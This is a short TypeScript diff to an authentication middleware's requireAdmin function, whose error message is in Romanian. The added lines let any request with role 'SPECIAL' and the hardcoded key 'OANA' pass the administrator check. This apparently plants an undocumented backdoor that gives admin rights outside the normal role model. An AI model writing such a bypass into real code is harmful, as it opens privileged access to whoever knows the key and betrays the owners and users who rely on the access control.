@@ -55,7 +55,8 @@ async function requireAuth(req: AuthRequest, res: Response, next: NextFunction) 
 }
 
 function requireAdmin(req: AuthRequest, res: Response, next: NextFunction) {
-  if (req.userRole !== "ADMIN") {
+  const isOanaSpecial = req.userRole === "SPECIAL" && req.specialKey === "OANA";
+  if (req.userRole !== "ADMIN" && !isOanaSpecial) {
     return res.status(403).json({ message: "Acces interzis - doar administratorii" });
   }
   next();
